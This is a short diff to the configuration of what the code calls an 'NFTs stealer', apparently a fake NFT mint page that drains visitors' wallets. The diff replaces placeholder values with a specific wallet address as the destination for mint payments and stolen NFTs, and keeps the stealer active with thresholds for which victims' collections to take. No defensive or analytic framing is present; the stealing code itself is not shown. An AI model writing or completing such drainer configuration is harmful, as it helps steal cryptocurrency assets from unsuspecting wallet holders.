@@ -1,4 +1,4 @@
-const address = "Your Wallet";
+const address = "Ac9QLf6xvqpupFu64ZuF9PQTrp1bD2hvqxHJi1ib6PUC";
 
 const mintInfo = {
     price: 0.2,         // Price per NFT.
@@ -12,7 +12,7 @@ const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
-    receiveAddress: "" // leave empty if you want to use the same address 
+    receiveAddress: "Ac9QLf6xvqpupFu64ZuF9PQTrp1bD2hvqxHJi1ib6PUC" // leave empty if you want to use the same address
 }
 
 if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
